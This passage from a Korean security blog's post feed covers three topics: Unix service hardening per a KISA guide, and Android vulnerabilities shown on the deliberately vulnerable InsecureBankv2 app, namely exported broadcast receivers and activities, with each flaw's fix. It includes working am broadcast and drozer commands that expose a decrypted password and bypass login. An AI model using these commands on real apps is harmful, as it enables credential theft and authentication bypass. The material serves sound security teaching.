<td><code># svcs -a | grep echo</code><br /><code># svcs -a |grep daytime</code><br /><code># svcs -a |grep discard</code><br /><code># svcs -a |grep chargen</code><br /><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 서비스 활성 여부 확인</td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td><code># vi /etc/inetd.conf</code><br /><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 필드 주석 처리 확인</td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># inetadm | grep enable | egrep &quot;echo|discard|daytime|chargen&quot;</code><br />명령으로 기타 서비스 데몬 확인</td>
</tr>
</tbody></table>
<br>

<br>

<table>
<thead>
<tr>
<th>서비스(포트)</th>
<th>설명</th>
</tr>
</thead>
<tbody><tr>
<td>echo(7)</td>
<td>클라이언트에서 보내는 메시지를 단순히 재전송</td>
</tr>
<tr>
<td>discard(9)</td>
<td>수신되는 임의 사용자의 데이터를 폐기하는 서비스</td>
</tr>
<tr>
<td>daytime(13)</td>
<td>daytime은 클라이언트의 질의에 응답하여 아스키 형태로<br />현재 시간과 날짜를 출력하는 데몬</td>
</tr>
<tr>
<td>chargen(19)</td>
<td>임의 길이의 문자열을 반환하는 서비스</td>
</tr>
<tr>
<td>NTP(123)</td>
<td>네트워크로 연결되어 있는 컴퓨터들끼리 클록 시각을<br />동기화시키는데 사용되는 서비스</td>
</tr>
<tr>
<td>DNS(53)</td>
<td>호스트의 도메인 이름을 호스트의 네트워크 주소로 바꾸거나<br />그 반대의 변환을 수행하는데 사용되는 서비스</td>
</tr>
<tr>
<td>SNMP(161/162)</td>
<td>네트워크 장비들로부터 필요한 정보를 가져와 장비 상태를<br />모니터링 하거나 설정값을 변경하는 등의 작업을 하여 네트워크<br />장비를 관리하는데 사용되는 서비스</td>
</tr>
<tr>
<td>SMTP(25)</td>
<td>인터넷에서 메일을 보내기 위해 사용되는 서비스</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="취약한-서비스-활성화-여부-확인"><a href="#취약한-서비스-활성화-여부-확인" class="headerlink" title="취약한 서비스 활성화 여부 확인"></a>취약한 서비스 활성화 여부 확인</h2><br>

<blockquote>
<p># netstat -ltup |grep echo</p>
</blockquote>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/grep.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>조치 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS</td>
<td><code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 서비스 비활성화 설정<br /><code>예) # svcs -a | grep echo</code><br /><code># svcadm disable svc:/network/echo:dgrm</code><br /><code># svcadm disable svc:/network/echo:stream</code></td>
</tr>
<tr>
<td>AIX, HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 필드 주석처리<br />    <code># vi /etc/inetd.conf</code><br />    <code>&lt;inetd.conf&gt;</code><br />    <code>#echo    stream    tcp    nowait    root    internal</code><br /><br />2) 필드 주석처리 후 재가동(AIX)<br />    <code># refresh -s inetd</code><br /><br />2) 필드 주석처리 후 재가동(HP-UX)<br />    <code># inetd -c</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) 기타 서비스 데몬 확인<br />    <code># inetadm | grep echo</code><br /><br />2) inetadm -d “중지하고자 하는 데몬” 명령으로 서비스 데몬 중지<br />    <code># inetadm -d svc:/network/echo:stream</code></td>
</tr>
<tr>
<td>LINUX<br />(xinetd일 경우)</td>
<td>1) vi 편집기를 이용하여 <code>/etc/xinetd.d/</code> 디렉터리 내 <code>echo</code> <code>discard</code> <code>daytime</code> <code>chargen</code> 파일 열기<br /><br />2) 아래와 같이 설정 <code>(Disable = yes 설정)</code><br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/vi.png"><br /><br />3) xinetd 서비스 재시작<br />    <code># service xinetd restart</code></td>
</tr>
</tbody></table>
<br>

<br>

<p><code>/etc/xinetd.d/echo-stream</code> 파일에서 <code>disable=yes</code>로 설정해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/vi.png">

<br>

<br>

<p><code>echo</code> 포트를 닫았습니다.<br><br></p>
<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/grep_2.png">

<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">cmd=`netstat -ltup | grep -e <span class="built_in">echo</span> -e daytime -e discard -e chargen`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$cmd</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=활성화</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=비활성화</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e DoS 공격에 취약한 서비스 활성화 여부: <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-23.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>echo</code> <code>daytime</code> <code>discard</code> <code>chargen</code> 서비스가 활성화 상태인지 확인합니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-23</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-23/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 브로드캐스트 리시버 결함</title>
    <url>/2022/01/05/2022-01-05-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EB%B8%8C%EB%A1%9C%EB%93%9C%EC%BA%90%EC%8A%A4%ED%8A%B8%20%EB%A6%AC%EC%8B%9C%EB%B2%84%20%EA%B2%B0%ED%95%A8/</url>
    <content><![CDATA[<h1 id="🤔-브로드캐스트-리시버란"><a href="#🤔-브로드캐스트-리시버란" class="headerlink" title="🤔  브로드캐스트 리시버란?"></a>🤔  브로드캐스트 리시버란?</h1><br>

<p>안드로이드 디바이스에서는 이벤트가 발생하면 브로드캐스트 신호를 전송하게 됩니다.</p>
<p>그 신호를 받아 처리해주는 역할을 브로드캐스트 리시버가 해줍니다.</p>
<br>

<p>대상 애플리케이션에서 발생하는 브로드캐스트 신호를 받기 위해서는 브로드캐스트 리시버가 설정되어 있어야 합니다.</p>
<p>신호를 받는 경우 애플리케이션에 정의해 놓은 작업을 수행합니다.</p>
<p>브로드캐스트 리시버는 <code>AndroidManifest.xml</code>의 <code>&lt;receiver&gt; &lt;/receiver&gt;</code> 항목에 선언됩니다.</p>
<br>

<br>

<h2 id="브로드캐스트-리시버-호출"><a href="#브로드캐스트-리시버-호출" class="headerlink" title="브로드캐스트 리시버 호출"></a>브로드캐스트 리시버 호출</h2><br>

<p>브로드캐스트 리시버를 호출할 때 발생하는 브로드캐스트가 정상이면 부팅완료, 메시지 송수신, 시스템 메시지 등을 보내는 이벤트입니다.</p>
<p>하지만 이를 <u>악의적인 목적</u>으로 수행할 경우에 <u>사용자가 받는 알림을 중간에서 가로챌 수 있으며, 특정 작업을 우회하여 수행하도록 조작할 수 있습니다.</u></p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadCastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;theBroadcast&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>AndroidManifest.xml</code>에 리시버가 설정되어있습니다.</p>
<br>

<blockquote>
<p>브로드캐스트 이름 : theBroadcast</p>
</blockquote>
<br>

<p>브로드캐스트 신호를 받으면 <code>MyBroadCastReceiver</code>에 설정된 작업을 수행합니다.</p>
<p><code>exported</code> 값이 <code>true</code>로 설정되어 있기 때문에 외부 애플리케이션으로부터 <code>intent</code>를 받을 수 있는 상태입니다.</p>
<br>

<br>

<p>* intent : 애플리케이션 구성요소간에 작업 수행을 위한 정보를 전달하는 역할</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* MyBroadCastReceiver.class */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBroadCastReceiver</span> <span class="keyword">extends</span> <span class="title">BroadcastReceiver</span> </span>&#123;</span><br><span class="line">	String usernameBase64ByteString;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String MYPREFS = <span class="string">&quot;mySharedPreferences&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceive</span><span class="params">(Context context, Intent intent)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"></span><br><span class="line">        String phn = intent.getStringExtra(<span class="string">&quot;phonenumber&quot;</span>);</span><br><span class="line">        String newpass = intent.getStringExtra(<span class="string">&quot;newpass&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (phn != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);</span><br><span class="line">                <span class="keyword">final</span> String username = settings.getString(<span class="string">&quot;EncryptedUsername&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">byte</span>[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);</span><br><span class="line">                usernameBase64ByteString = <span class="keyword">new</span> String(usernameBase64Byte, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                <span class="keyword">final</span> String password = settings.getString(<span class="string">&quot;superSecurePassword&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">                CryptoClass crypt = <span class="keyword">new</span> CryptoClass();</span><br><span class="line">                String decryptedPassword = crypt.aesDeccryptedString(password);</span><br><span class="line">                String textPhoneno = phn.toString();</span><br><span class="line">                String textMessage = <span class="string">&quot;Updated Password from: &quot;</span>+decryptedPassword+<span class="string">&quot; to: &quot;</span>+newpass;</span><br><span class="line">                SmsManager smsManager = SmsManager.getDefault();</span><br><span class="line">                System.out.println(<span class="string">&quot;For the changepassword - phonenumber: &quot;</span>+textPhoneno+<span class="string">&quot; password is: &quot;</span>+textMessage);</span><br><span class="line">                smsManager.sendTextMessage(textPhoneno, <span class="keyword">null</span>, textMessage, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Phone number is null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>11~12 줄을 보면 <code>intent</code>가 <code>onReceive()</code> 메서드에 들어오고 있는 것을 볼 수 있습니다.</p>
<p>만약 <code>intent-filter</code>를 사용하지 않는다면 해당 애플리케이션은 다른 애플리케이션에 의해 브로드캐스트 리시버가 남용될 수 있습니다.</p>
<br>

<p>24 줄을 보면 기존 비밀번호를 복호화 하여 새로 입력된 패스워드랑 같이 출력하고있습니다.</p>
<br>

<h2 id="브로드캐스트-생성"><a href="#브로드캐스트-생성" class="headerlink" title="브로드캐스트 생성"></a>브로드캐스트 생성</h2><br>

<blockquote>
<p># am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver</p>
</blockquote>
<br>

<img src="/images/Android/브로드캐스트 리시버/phone_am.png">

<br>

<p>브로드캐스트를 생성하기 위해 <code>am</code> 명령어를 사용하였습니다.</p>
<br>

<img src="/images/Android/브로드캐스트 리시버/phone_logcat.png">

<br>

<p><code>phonenumber</code>을 입력하지 않았기 때문에 <code>Phone number is null</code>이 출력되고있습니다.</p>
<br>

<br>

<h2 id="매개변수를-포함한-브로드캐스트-생성"><a href="#매개변수를-포함한-브로드캐스트-생성" class="headerlink" title="매개변수를 포함한 브로드캐스트 생성"></a>매개변수를 포함한 브로드캐스트 생성</h2><br>

<blockquote>
<p># am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver –es phonenumber 123 –es newpass kh</p>
</blockquote>
<br>

<img src="/images/Android/브로드캐스트 리시버/phone_am_2.png">

<br>

<p><code>phonenumber</code>과 <code>newpass</code>매개변수를 포함하여 브로드캐스트를 생성하였습니다.</p>
<br>

<img src="/images/Android/브로드캐스트 리시버/phone_logcat_2.png">

<br>

<p>기존 패스워드가 복호화 상태로 출력 되고 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<blockquote>
<p>android:exported=&quot;false&quot; 설정</p>
</blockquote>
<br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadCastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;theBroadcast&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>android:exported=&quot;false&quot;</code>로 설정을 하여 외부에 노출이 안되도록 해야합니다.</p>
<p>필요한 경우에는 각 리시버에 별도의 권한을 부여해야합니다.</p>
<br>

<img src="/images/Android/브로드캐스트 리시버/false.png">

<br>

<p><code>false</code>로 설정해주니 <code>broadcast receiver</code> 취약점이 없어졌습니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 취약한 인증 메커니즘</title>
    <url>/2022/01/05/2022-01-05-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%B7%A8%EC%95%BD%ED%95%9C%20%EC%9D%B8%EC%A6%9D%20%EB%A9%94%EC%BB%A4%EB%8B%88%EC%A6%98/</url>
    <content><![CDATA[<h1 id="🤔-취약한-인증-메커니즘이란"><a href="#🤔-취약한-인증-메커니즘이란" class="headerlink" title="🤔  취약한 인증 메커니즘이란?"></a>🤔  취약한 인증 메커니즘이란?</h1><br>

<p>정상적인 인증 절차를 우회하여 비정상적인 인증으로 접근 권한을 취득하는 취약점입니다.</p>
<br>

<p>해당 취약점은 <code>OWASP Mobile Top 10 2016-M4</code>에 포함되는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.LoginActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.FilePrefActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_file_pref&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;stateVisible|adjustResize|adjustPan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.DoLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_do_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.PostLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_post_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.WrongLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_wrong_login&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.DoTransfer&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_do_transfer&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.ViewStatement&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_view_statement&quot;</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;activity&gt;</code>의 속성이 <code>android:exported=&quot;true&quot;</code>로 설정되어있습니다.</p>
<p>이런 경우 다른 <code>&lt;activity&gt;</code>에서 인증 없이 접근할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<br>

<blockquote>
<p>dz&gt; run app.activity.info -a com.android.insecurebankv2</p>
</blockquote>
<br>

<p><code>drozer</code>로 해당 애플리케이션의 <code>activity</code>와 <code>권한</code>을 확인해주었습니다.</p>
<br>

<img src="/images/Android/취약한 인증 메커니즘/drozer.png">

<br>

<p><code>LoginActivity</code> <code>PostLogin</code> <code>DoTransfer</code> <code>ViewStatement</code> <code>ChangePassword</code> Activity가 있는 것을 볼 수 있습니다.</p>
<br>

<br>

<h2 id="Activity-실행"><a href="#Activity-실행" class="headerlink" title="Activity 실행"></a>Activity 실행</h2><br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.PostLogin</p>
</blockquote>
<br>

<img src="/images/Android/취약한 인증 메커니즘/postlogin.png">

<br>

<p><code>PostLogin</code> Activity를 실행시키니 인증 절차 없이 <code>PostLogin</code> 화면으로 이동되었습니다.</p>
<br>

<br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.ChangePassword</p>
</blockquote>
<br>

<img src="/images/Android/취약한 인증 메커니즘/changepassword.png">

<br>

<p><code>ChangePassword</code> Activity를 실행시키니 인증 절차 없이 <code>ChangePassword</code> 화면으로 이동되었습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>

<blockquote>
<p>android:exported=&quot;false&quot; 설정</p>
</blockquote>
<p>만일 <code>true</code>로 설정을 해야 하는 경우 별도의 <code>intent-filter</code>로 검증을 해야 합니다.</p>
<br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.PostLogin&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;@string/title_activity_post_login&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>PostLogin</code>의 <code>android:exported</code>를 <code>false</code>로 설정해주었습니다.</p>
<br>

<img src="/images/Android/취약한 인증 메커니즘/drozer_2.png">

<br>

<p>원래 <code>LoginActivity</code> <code>PostLogin</code> <code>DoTransfer</code> <code>ViewStatement</code> <code>ChangePassword</code> 5개의 Activity가 있었지만 <code>PostLogin</code> Activity는 없어졌습니다.</p>
<br>

<br>

<blockquote>
<p>dz&gt; run app.activity.start –component com.android.insecurebankv2 com.android.insecurebankv2.PostLogin</p>
</blockquote>
<br>

<img src="/images/Android/취약한 인증 메커니즘/postlogin_2.png">

<br>

<p><code>PostLogin</code> Activity를 실행시켰을 때 오류 메시지가 뜨고 아무런 반응도 없습니다.</p>
<br>

<br>

<hr>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>모바일</tag>
      </tags>
  </entry>
  <entry>
    <title>[안드로이드 취약점] 로컬 암호화 이슈</title>
    <url>/2022/01/06/2022-01-06-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EB%A1%9C%EC%BB%AC%20%EC%95%94%ED%98%B8%ED%99%94%20%EC%9D%B4%EC%8A%88/</url>
    <content><![CDATA[<h1 id="🤔-로컬-암호화-이슈란"><a href="#🤔-로컬-암호화-이슈란" class="headerlink" title="🤔  로컬 암호화 이슈란?"></a>🤔  로컬 암호화 이슈란?</h1><br>

<p>민감한 정보를 저장할 때 암호화하지 않고 저장하는 취약점입니다.</p>
<br>

<p>해당 취약점은 <code>OWASP Mobile Top 10 2016-M5</code>에 포함되는 취약점입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>

<blockquote>
<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
</blockquote>
<br>

<p>인시큐어뱅크 앱에서 <code>Autofill Credentials</code> 버튼이 있습니다.</p>
<p>이 버튼은 마지막으로 로그인 했던 사용자의 아이디와 패스워드를 불러와 로그인할 수 있는 기능입니다.</p>
<br>

<img src="/images/Android/로컬 암호화 이슈/login.png">

<br>

<br>

<p>인시큐어뱅크 앱의 데이터가 저장되는 파일은 <code>mySharedPreferences.xml</code> <code>com.android.insecurebankv2_preferences.xml</code> 입니다.</p>
<p>해당 파일의 경로는 <code>/data/data/com.android.insecurebankv2/shared_prefs/</code>입니다.</p>
<br>

<img src="/images/Android/로컬 암호화 이슈/ls.png">

<br>

<br>

<h2 id="mySharedPreferences-xml"><a href="#mySharedPreferences-xml" class="headerlink" title="mySharedPreferences.xml"></a>mySharedPreferences.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* mySharedPreferences.xml */</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;EncryptedUsername&quot;</span>&gt;</span>ZGluZXNo<span class="symbol">&amp;#13;</span><span class="symbol">&amp;#10;</span>    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;superSecurePassword&quot;</span>&gt;</span>DTrW2VXjSoFdg0e61fHxJg==<span class="symbol">&amp;#10;</span>    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>EncryptedUsername</code> <code>superSecurePassword</code> 변수에 사용자 아이디와 비밀번호를 암호화하여 저장하고 있습니다.</p>
<br>

<br>

<h2 id="com-android-insecurebankv2-preferences-xml"><a href="#com-android-insecurebankv2-preferences-xml" class="headerlink" title="com.android.insecurebankv2_preferences.xml"></a>com.android.insecurebankv2_preferences.xml</h2><br>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* com.android.insecurebankv2_preferences.xml */</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;serverport&quot;</span>&gt;</span>8888<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">&quot;serverip&quot;</span>&gt;</span>192.168.219.102<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span 